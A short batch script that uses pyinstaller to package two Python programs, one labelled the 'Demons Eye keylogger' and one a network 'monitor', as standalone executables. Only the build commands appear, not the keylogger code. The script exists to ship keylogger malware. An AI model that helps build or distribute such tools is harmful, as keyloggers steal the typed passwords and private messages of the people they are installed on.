REM Executable creator for python code

ECHO Building Demons Eye keylogger
pyinstaller -F --noupx --clean demonseye.py

ECHO Building Demons Eye monitor
pyinstaller -F --noupx --clean demonseye-net-search.py